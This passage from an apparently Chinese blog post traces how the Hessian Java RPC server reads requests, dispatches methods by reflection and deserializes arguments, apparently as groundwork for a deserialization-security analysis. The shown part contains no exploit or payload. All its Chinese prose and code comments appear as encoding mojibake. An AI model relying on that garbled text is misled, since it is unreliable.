å¯é€‰çš„åºåˆ—åŒ–å·¥å‚ï¼ˆå½±å“ç™½/é»‘åå•ã€é›†åˆç±»å‹å‘é€ç­‰ç­–ç•¥ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception ç¼–è§£ç æˆ–ä¸šåŠ¡è°ƒç”¨è¿‡ç¨‹ä¸­æŠ›å‡ºçš„å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(InputStream is, OutputStream os, SerializerFactory serializerFactory)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 1) è¯»å–è¯·æ±‚å¤´ï¼Œåˆ¤å®šè°ƒç”¨/åº”ç­”æ‰€é‡‡ç”¨çš„ Hessian åè®®ç‰ˆæœ¬ç»„åˆ</span></span><br><span class="line">    HessianInputFactory.<span class="type">HeaderType</span> <span class="variable">header</span> <span class="operator">=</span> _inputFactory.readHeader(is);</span><br><span class="line"></span><br><span class="line">    AbstractHessianInput in;</span><br><span class="line">    AbstractHessianOutput out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) æ ¹æ®å¤´éƒ¨ç±»å‹é€‰æ‹©å¯¹åº”çš„ Hessian è¾“å…¥/è¾“å‡ºå®ç°</span></span><br><span class="line">    <span class="keyword">switch</span> (header) &#123;</span><br><span class="line">        <span class="comment">// å…¶å®ƒåˆ†æ”¯çœç•¥ï¼ˆå¦‚ CALL_1_REPLY_1ã€CALL_2_REPLY_2 ç­‰ï¼‰</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> CALL_1_REPLY_2:</span><br><span class="line">            <span class="comment">// å«ä¹‰ï¼šè¯·æ±‚ä½¿ç”¨ Hessian 1ï¼Œå“åº”ä½¿ç”¨ Hessian 2ã€‚</span></span><br><span class="line">            <span class="comment">// å…¸å‹ç”¨äºå…¼å®¹è€å®¢æˆ·ç«¯è¯·æ±‚ï¼ŒåŒæ—¶æœåŠ¡ç«¯å“åº”ä¾§ä½¿ç”¨ Hessian 2 æå‡æ•ˆç‡/ç‰¹æ€§ã€‚</span></span><br><span class="line">            in = _hessianFactory.createHessianInput(is);        <span class="comment">// Hessian 1 è¾“å…¥</span></span><br><span class="line">            out = _hessianFactory.createHessian2Output(os);     <span class="comment">// Hessian 2 è¾“å‡º</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) å®‰è£…ï¼ˆåï¼‰åºåˆ—åŒ–ç­–ç•¥å·¥å‚ï¼šæ§åˆ¶ç±»ç™½/é»‘åå•ã€é›†åˆç±»å‹æ˜¯å¦å‘é€ç­‰</span></span><br><span class="line">    <span class="keyword">if</span> (serializerFactory != <span class="literal">null</span>) &#123;</span><br><span class="line">        in.setSerializerFactory(serializerFactory);</span><br><span class="line">        out.setSerializerFactory(serializerFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 4) è¿›å…¥å®é™…çš„ RPC åˆ†å‘é€»è¾‘ï¼š</span></span><br><span class="line">        <span class="comment">//    Skeleton åŸºäº _serviceï¼ˆå®ç°å¯¹è±¡ï¼‰ä¸ API ç­¾ååšåå°„è°ƒç”¨ï¼Œ</span></span><br><span class="line">        <span class="comment">//    å°†ä¸šåŠ¡è¿”å›å€¼æˆ–å¼‚å¸¸ç¼–ç åå†™å…¥ outã€‚</span></span><br><span class="line">        invoke(_service, in, out);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 5) èµ„æºæ”¶å°¾ï¼ˆçœŸå®å®ç°ä¸­å¯èƒ½éœ€è¦ flush/close æˆ–ä¸Šä¸‹æ–‡æ¸…ç†ï¼Œè¿™é‡ŒæŒ‰åŸä»£ç çœç•¥ï¼‰</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HessianSkeleton#invoke</code> å‡½æ•°ä¼šå°†åŸæœ¬çš„ <code>ServletRequest</code> è¾“å…¥æµå’Œ <code>ServletResponse</code> è¾“å‡ºæµå°è£…ä¸º <code>HessianInput</code> å’Œ <code>HessianOutput</code>ã€‚åé¢çš„ <code>readObject</code> å’Œ <code>writeObject</code> å°±æ˜¯åŸºäºè¿™ä¸¤ä¸ªè¾“å…¥è¾“å‡ºå¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in = _hessianFactory.createHessianInput(is);</span><br><span class="line">out = _hessianFactory.createHessian2Output(os); </span><br></pre></td></tr></table></figure></div>

<p>åˆ›å»ºå¥½è¾“å…¥è¾“å‡ºæµåï¼Œè®¾ç½®å…¶åºåˆ—åŒ–å™¨å·¥å‚ï¼Œç»§ç»­ <code>invoke</code>ï¼Œè¿™é‡Œçœ‹åˆ°å¤šå‡ºäº†ä¸€ä¸ª <code>_service</code> å¯¹è±¡ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke(_service, in, out);</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ­£æ˜¯æˆ‘ä»¬çš„ <code>HelloServiceServlet</code> å¯¹è±¡ï¼Œå®ƒæ˜¯ <code>HessianSkeleton</code> çš„å±æ€§ï¼ˆ<code>init</code> æ„é€  Skeleton çš„æ—¶å€™ä¼ è¿›æ¥çš„ï¼‰ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºä¸€ä¸ªæ–°çš„ HessianSkeletonï¼ˆæœåŠ¡ç«¯åˆ†å‘å™¨ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä½œç”¨ï¼š</span></span><br><span class="line"><span class="comment"> * - æŒæœ‰â€œæœåŠ¡å®ç°å¯¹è±¡ï¼ˆserviceï¼‰â€ä¸â€œå¯¹å¤– API ç±»å‹ï¼ˆapiClassï¼‰â€ï¼Œ</span></span><br><span class="line"><span class="comment"> *   åç»­æ ¹æ® API æ–¹æ³•ç­¾åå¯¹è¯·æ±‚åšåå°„è°ƒç”¨ä¸ç»“æœè¿”å›ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> service  ä¸šåŠ¡å®ç°å¯¹è±¡ï¼›è‹¥ä¼ å…¥ä¸º nullï¼Œåˆ™å›é€€ä¸ºå½“å‰ Skeleton å®ä¾‹ï¼ˆå…¼å®¹æ€§ç”¨æ³•ï¼Œä¸å¸¸ç”¨ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> apiClass å¯¹å¤–æš´éœ²çš„ API æ¥å£æˆ–ç±»ï¼ˆå¿…é¡»æ˜¯ service çš„çˆ¶ç±»å‹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HessianSkeleton</span><span class="params">(Object service, Class&lt;?&gt; apiClass)</span> &#123;</span><br><span class="line">    <span class="comment">// çˆ¶ç±»é€šå¸¸ä¼šè®°å½•/æ ¡éªŒ API ç±»å‹ç­‰å…ƒæ•°æ®</span></span><br><span class="line">    <span class="built_in">super</span>(apiClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…¼å®¹æ€§å¤„ç†ï¼šè‹¥æœªæ˜¾å¼æä¾›å®ç°å¯¹è±¡ï¼Œåˆ™ä½¿ç”¨å½“å‰ Skeleton å®ä¾‹</span></span><br><span class="line">    <span class="comment">// è¯´æ˜ï¼šå¸¸è§„ç”¨æ³•åº”å½“æ˜¾å¼ä¼ å…¥çœŸå®çš„ä¸šåŠ¡å®ç°å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (service == <span class="literal">null</span>) &#123;</span><br><span class="line">        service = <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜æœåŠ¡å®ç°å¯¹è±¡ï¼Œåç»­é€šè¿‡åå°„è°ƒç”¨å…¶æ–¹æ³•</span></span><br><span class="line">    _service = service;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç±»å‹æ ¡éªŒï¼šè¦æ±‚ service å¿…é¡»å®ç°/ç»§æ‰¿ apiClassï¼Œ</span></span><br><span class="line">    <span class="comment">// å¦åˆ™åœ¨è¿è¡Œæ—¶æ— æ³•å°†è¯·æ±‚åˆ†æ´¾åˆ°çº¦å®šçš„ API æ–¹æ³•ä¸Š</span></span><br><span class="line">    <span class="keyword">if</span> (!apiClass.isAssignableFrom(service.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">            <span class="string">&quot;Service &quot;</span> + service + <span class="string">&quot; must be an instance of &quot;</span> + apiClass.getName()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¯»å–æ–¹æ³•åï¼ˆ<code>methodName</code>ï¼‰ï¼ŒæŸ¥æ‰¾è°ƒç”¨æ–¹æ³•ï¼ˆ<code>getMethod</code>ï¼Œä» <code>_methodMap</code> è·å–ï¼‰ï¼Œæ ¹æ® <code>Method</code> å¯¹è±¡è·å–å‚æ•°ä¸ªæ•°ã€‚</p>
<p>æ¥ç€ä»è¾“å…¥æµååºåˆ—åŒ–å‚æ•°ï¼Œä¼ å…¥çš„æ˜¯å‚æ•°ç±»å‹ï¼ˆ<code>HessianInput#readObject(Class&lt;?&gt; cl)</code>ï¼‰;</p>
<p>æœ€åè°ƒç”¨æ–¹æ³•ï¼Œå¹¶å†™åˆ°è¾“å‡ºæµä¸­è¿›è¡Œåºåˆ—åŒ–ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è°ƒç”¨å…¥å£ï¼šåŸºäº Hessian è¾“å…¥æµè§£æè°ƒç”¨ä¿¡æ¯ï¼Œåå°„è°ƒç”¨ service å¹¶å°†ç»“æœå†™å›ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * å…¼å®¹æ€§è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"> * 1) æŸäº›æ—§æ¡†æ¶åœ¨è¯»å–å‰ä¸ä¼šå…ˆå‘é€ call typeï¼Œè¿™é‡Œé€šè¿‡ skipOptionalCall() å…¼å®¹ï¼›</span></span><br><span class="line"><span class="comment"> * 2) æ”¯æŒ Hessian 1.0 çš„å¤´éƒ¨ï¼ˆheaderï¼‰è¯»å–å¹¶ä¿å­˜åˆ° ServiceContextï¼›</span></span><br><span class="line"><span class="comment"> * 3) æ–¹æ³•è§£æåŒæ—¶æ”¯æŒ â€œæ–¹æ³•å__å‚æ•°ä¸ªæ•°â€ çš„é‡è½½é€‰æ‹©ç­–ç•¥ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> service  ä¸šåŠ¡å®ç°å¯¹è±¡ï¼ˆSkeleton åœ¨å¤–å±‚å·²ç¡®ä¿å…¶ä¸ API ç±»å‹åŒ¹é…ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in       Hessian è¾“å…¥ï¼ˆè¯·æ±‚ååºåˆ—åŒ–ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> out      Hessian è¾“å‡ºï¼ˆå“åº”åºåˆ—åŒ–ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception ä»»æ„ç¼–è§£ç æˆ–åå°„è°ƒç”¨ä¸­å‡ºç°çš„å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Object service,</span></span><br><span class="line"><span class="params">                   AbstractHessianInput in,</span></span><br><span class="line"><span class="params">                   AbstractHessianOutput out)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼šå¯ç”¨äºåœ¨ä¸šåŠ¡å®ç°ä¸­è·å–è¯·æ±‚çº§åˆ«çš„ header/å±æ€§ç­‰</span></span><br><span class="line">    <span class="type">ServiceContext</span> <span class="variable">context</span> <span class="operator">=</span> ServiceContext.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…¼å®¹æ—§å®¢æˆ·ç«¯ï¼šéƒ¨åˆ†å®ç°ä¸ä¼šå…ˆå‘é€ call typeï¼Œè¿™é‡Œå°è¯•è·³è¿‡å¯é€‰çš„ call æ ‡è®°</span></span><br><span class="line">    in.skipOptionalCall();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hessian 1.0 å…¼å®¹ï¼šè¯»å–å¹¶ä¿å­˜è¯·æ±‚å¤´ä¿¡æ¯ï¼ˆå¯èƒ½åŒ…å«è‡ªå®šä¹‰çš„å…ƒæ•°æ®ï¼‰</span></span><br><span class="line">    String header;</span><br><span class="line">    <span class="keyword">while</span> ((header = in.readHeader()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        context.addHeader(header, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ–¹æ³•åä¸å‚æ•°ä¸ªæ•°ï¼ˆ-1 è¡¨ç¤ºå®¢æˆ·ç«¯æœªæ˜¾å¼ä¼ é€’å‚æ•°é•¿åº¦ï¼‰</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> in.readMethod();</span><br><span class="line">    <span class="type">int</span> <span class="variable">argLength</span> <span class="operator">=</span> in.readMethodArgLength();</span><br><span class="line"></span><br><span class="line">    Method method;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¼˜å…ˆå°è¯•â€œæ–¹æ³•å__å‚æ•°ä¸ªæ•°â€çš„å½¢å¼ï¼Œä¾¿äºåŒºåˆ†é‡è½½</span></span><br><span class="line">    method = getMethod(methodName + <span class="string">&quot;__&quot;</span> + argLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å›é€€ï¼šä»…æŒ‰æ–¹æ³•ååŒ¹é…ï¼ˆå½“å®¢æˆ·ç«¯æœªæä¾›å‚æ•°ä¸ªæ•°æˆ–æœªå¯ç”¨é‡è½½åŒºåˆ†ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">        method = getMethod(methodName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç‰¹æ®Šå†…çœæ–¹æ³•ï¼š_hessian_getAttributeï¼Œç”¨äºå‘å®¢æˆ·ç«¯æš´éœ²ç±»åç­‰å…ƒä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;_hessian_getAttribute&quot;</span>.equals(methodName)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">attrName</span> <span class="operator">=</span> in.readString();</span><br><span class="line">            in.completeCall();</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;java.api.class&quot;</span>.equals(attrName)) &#123;</span><br><span class="line">                value = getAPIClassName();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.home.class&quot;</span>.equals(attrName)) &#123;</span><br><span class="line">                value = getHomeClassName();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.object.class&quot;</span>.equals(attrName)) &#123;</span><br><span class="line">                value = getObjectClassName();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.writeReply(value);</span><br><span class="line">            out.close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ–¹æ³•ä¸å­˜åœ¨ï¼šä»¥ Hessian fault çš„å½¢å¼è¿”å›</span></span><br><span class="line">            out.writeFault(</span><br><span class="line">                    <span class="string">&quot;NoSuchMethodException&quot;</span>,</span><br><span class="line">                    escapeMessage(<span class="string">&quot;The service has no method named: &quot;</span> + in.getMethod()),</span><br><span class="line">                    <span class="literal">null</span></span><br><span class="line">            );</span><br><span class="line">            out.close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½¢å‚ç±»å‹ä¸é•¿åº¦æ ¡éªŒ</span></span><br><span class="line">    Class&lt;?&gt;[] args = method.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (argLength != args.length &amp;&amp; argLength &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        out.writeFault(</span><br><span class="line">                <span class="string">&quot;NoSuchMethod&quot;</span>,</span><br><span class="line">                escapeMessage(<span class="string">&quot;method &quot;</span> + method + <span class="string">&quot; argument length mismatch, received length=&quot;</span> + argLength),</span><br><span class="line">                <span class="literal">null</span></span><br><span class="line">        );</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ååºåˆ—åŒ–å‚æ•°ï¼ˆæŒ‰å£°æ˜ç±»å‹é€ä¸ªè¯»å–ï¼‰</span></span><br><span class="line">    Object[] values = <span class="keyword">new</span> <span class="title class_">Object</span>[args.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> æ›´ç»†ç²’åº¦çš„ç¼–ç»„/æ ¡éªŒå¯åœ¨æ­¤å¤„æ‰©å±•ï¼ˆä¾‹å¦‚æšä¸¾/é›†åˆçš„å®‰å…¨æ ¡éªŒï¼‰</span></span><br><span class="line">        values[i] = in.readObject(args[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„è°ƒç”¨å®é™…çš„ä¸šåŠ¡æ–¹æ³•</span></span><br><span class="line">        result = method.invoke(service, values);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// è§£åŒ… InvocationTargetExceptionï¼Œè·å–çœŸå®ä¸šåŠ¡å¼‚å¸¸</span></span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">e1</span> <span class="operator">=</span> e;</span><br><span class="line">        <span class="keyword">if</span> (e1 <span class="keyword">instanceof</span> InvocationTargetException) &#123;</span><br><span class="line">            e1 = ((InvocationTargetException) e).getTargetException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®°å½•ç»†ç²’åº¦æ—¥å¿—ï¼ˆé€šå¸¸ä¸º FINE çº§åˆ«ï¼Œé¿å…æ±¡æŸ“ç”Ÿäº§æ—¥å¿—ï¼‰</span></span><br><span class="line">        log.log(Level.FINE, <span class="built_in">this</span> + <span class="string">&quot; &quot;</span> + e1.toString(), e1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»¥ Hessian fault è¿”å›ï¼ˆ&quot;ServiceException&quot;ï¼‰ï¼Œå¹¶æºå¸¦æœåŠ¡ç«¯å¼‚å¸¸ä¿¡æ¯</span></span><br><span class="line">        out.writeFault(</span><br><span class="line">                <span class="string">&quot;ServiceException&quot;</span>,</span><br><span class="line">                escapeMessage(e1.getMessage()),</span><br><span class="line">                e1</span><br><span class="line">        );</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šcompleteCall éœ€è¦æ”¾åœ¨ invoke ä¹‹åï¼Œä»¥ä¾¿å¤„ç†å°¾éšçš„ InputStream ç­‰æ•°æ®</span></span><br><span class="line">    in.completeCall();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­£å¸¸è¿”å›ç»“æœ</span></span><br><span class="line">    out.writeReply(result);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­è¾“å‡ºï¼ˆflush + ç»“æŸå“åº”ï¼‰</span></span><br><span class="line">    out.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="ååºåˆ—åŒ–è¿‡ç¨‹-1"><a href="#ååºåˆ—åŒ–è¿‡ç¨‹-1" class="headerlink" title="ååºåˆ—åŒ–è¿‡ç¨‹"></a>ååºåˆ—åŒ–è¿‡ç¨‹</h3><h4 id="SerializerFactory-åˆå§‹åŒ–"><a href="#SerializerFactory-åˆå§‹åŒ–" class="headerlink" title="SerializerFactory åˆå§‹åŒ–"></a>SerializerFactory åˆå§‹åŒ–</h4><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆå…³æ³¨ <code>com.caucho.hessian.server.HessianServlet#service</code> è¿‡ç¨‹å¯¹ <code>SerializerFactory</code> å¯¹è±¡çš„åˆå§‹åŒ–ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åºåˆ—åŒ–å·¥å‚ï¼ˆåŒ…å«ç™½/é»‘åå•ã€é›†åˆç±»å‹å‘é€å¼€å…³ç­‰åºåˆ—åŒ–ç­–ç•¥ï¼‰</span></span><br><span class="line"><span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> getSerializerFactory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ® objectId æ˜¯å¦å­˜åœ¨é€‰æ‹© home æˆ– object çš„ Skeletonï¼Œå¹¶å®Œæˆæ–¹æ³•åˆ†å‘</span></span><br><span class="line">invoke(is, os, objectId, serializerFactory);</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>getSerializerFactory</code> ä¼šè¿”å›è¿‘ä¼¼å•ä¾‹æ¨¡å¼çš„ <code>SerializerFactory</code> å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SerializerFactory <span class="title function_">getSerializerFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (_serializerFactory == <span class="literal">null</span>)</span><br><span class="line">        _serializerFactory = <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _serializerFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>com.caucho.hessian.io.SerializerFactory</code> çš„æ„é€ å‡½æ•°ä¼šæ ¹æ® <code>_isEnableUnsafeSerializer</code> æ˜¯å¦è®¾ç½®å†³å®šæ˜¯å¦ä½¿ç”¨ <code>FieldDeserializer2FactoryUnsafe</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ— å‚æ„é€ ï¼šä½¿ç”¨å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆTCCLï¼‰ä½œä¸ºé»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚</span></span><br><span class="line"><span class="comment"> * è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"> * - åœ¨å®¹å™¨ï¼ˆTomcat/Jettyï¼‰ä¸­ï¼ŒTCCL é€šå¸¸æŒ‡å‘ WebApp çš„ ClassLoaderï¼Œ</span></span><br><span class="line"><span class="comment"> *   èƒ½ç¡®ä¿ä¸šåŠ¡ç±»/è‡ªå®šä¹‰åºåˆ—åŒ–å™¨çš„å¯è§æ€§ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> 